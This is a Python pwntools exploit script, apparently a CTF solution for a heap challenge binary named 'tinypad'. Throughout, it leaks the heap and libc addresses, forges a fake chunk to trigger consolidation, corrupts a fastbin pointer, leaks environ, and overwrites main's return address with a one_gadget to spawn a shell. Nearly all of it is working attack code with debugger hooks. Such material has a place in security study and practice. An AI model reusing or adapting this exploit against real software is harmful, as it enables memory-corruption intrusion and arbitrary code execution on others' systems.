# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
name = './tinypad-patch'
r = process(name)

libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
def attach_and_debug():
    print(str(r.proc.pid))
    gdb.attach(r, """
    echo br _int_free\\n
    br malloc.c:4014
    x/50gx 0x602040
    x/50gx 0x0000000000603010-0x10
    """);
    print(str(r.proc.pid))

    r.interactive()

def add(size, data):
    r.recvuntil("(CMD)>>> ")
    r.sendline('a')
    r.recvuntil("(SIZE)>>> ")
    r.sendline(str(size))
    r.recvuntil("(CONTENT)>>> ")
    r.send(data)

def d(index):
    r.recvuntil("(CMD)>>> ")
    r.sendline('d')
    r.recvuntil("(INDEX)>>> ")
    r.sendline(str(index))

def edit(index, data):
    r.recvuntil("(CMD)>>> ")
    r.sendline('e')
    r.recvuntil("(INDEX)>>> ")
    r.sendline(str(index))
    r.recvuntil("(CONTENT)>>> ")
    r.send(data)
    r.recvuntil("(Y/n)>>")
    r.sendline("Y")


add(0x100,'AAAAAAAA\n')
add(0x100,'AAAAAAAA\n')
add(0x100,'AAAAAAAA\n')
add(0x100,'AAAAAAAA\n')

d(3)
d(1)

# 1. leak
r.recvuntil(" #   INDEX: 1")
r.recvuntil(" # CONTENT: ")
heap_base = u64(r.recvuntil('\n').strip('\x0a').ljust(8, '\0'))-0x120-0x70-0x90
print("heap_base: ", hex(heap_base))

r.recvuntil(" #   INDEX: 3")
r.recvuntil(" # CONTENT: ")
libc_base = u64(r.recv(6).ljust(8, '\0')) -  0x3c4b78
print("libc_base: ", hex(libc_base))

# pwndbg> p/x 0x7ffff7dd3f38- 0x7ffff7a0d000
# $3 = 0x3c6f38

malloc_hook = 0x3c4b10 + libc_base 
environ = 0x3c6f38+libc_base 

d(2)
d(4)

# 2. xxx

add(0xf8,'AAAAAAAA\n')
add(0xf8,'AAAAAAAA\n')
add(0xf8,'AAAAAAAA\n')
add(0x31,'AAAAAAAA\n')
d(1)

payload = ''
payload += "\0"*0xd0
payload += p64(0)+p64(0x21) # fake chunk
payload += p64(heap_base+0xe0)+p64(heap_base+0xe0) #TODO
payload += p64(0x20) # pre_size
add(0xf8, payload+"\n")
print("[*] consolidate fake chunk")
d(2) 


payload = ""
payload +=p64(0)*3+p64(0x121) # ！！free一个块的时候会看下一个块是不是in_use(下下个块的pre_inuse)
add(len(payload), payload+'\n')
attach_and_debug();pause()

d(1)
d(2)

print("[*] overwrite fastbin chunk->fd")
payload = ""
payload += "\0"*0xd0
payload += p64(0)+p64(0x31)
payload += p64(0x602140+0x28)
add(0xf8, payload+"\n")

d(1)
add(0x28, "AAAAAA\n")
add(0x28, p64(libc_base+0x3c6f38)+"\n") # environ
# attach_and_debug();pause()



r.recvuntil(" #   INDEX: 4")
r.recvuntil(" # CONTENT: ")
environ_addr = u64(r.recv(6).ljust(8, '\0')) 
main_ret_addr = environ_addr- 0xf0
one_gadget_addr = libc_base + 0x45216
print("environ_addr: ", hex(environ_addr)) 
print("main_ret_addr: ", hex(main_ret_addr)) 
print("one_gadget_addr: ", hex(one_gadget_addr)) 


edit(2, p64(main_ret_addr)+"\n")
edit(4, p64(one_gadget_addr)+"\n")




attach_and_debug();pause()

